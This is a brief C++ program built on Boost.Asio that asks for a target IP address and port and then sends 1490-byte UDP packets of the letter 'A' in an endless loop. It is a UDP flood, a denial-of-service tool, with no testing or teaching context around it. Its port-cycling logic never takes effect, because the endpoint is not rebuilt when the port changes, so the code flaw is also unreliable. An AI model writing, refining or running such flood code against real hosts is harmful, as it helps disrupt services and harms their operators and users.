#include <iostream>
#include <boost/asio.hpp>

using boost::asio::ip::udp;

int main() {
    boost::asio::io_service io_service;
    udp::socket socket(io_service);
    udp::endpoint remote_endpoint;

    socket.open(udp::v4());

    std::string target_ip;
    int target_port;
    std::cout << "IP Target: ";
    std::cin >> target_ip;
    std::cout << "Port: ";
    std::cin >> target_port;

    remote_endpoint = udp::endpoint(boost::asio::ip::address::from_string(target_ip), target_port);

    std::string message(1490, 'A'); // A string of 1490 'A's

    while (true) {
        socket.send_to(boost::asio::buffer(message), remote_endpoint);
        if (target_port == 65534) {
            target_port = 1;
        } else {
            ++target_port;
        }
    }

    return 0;
}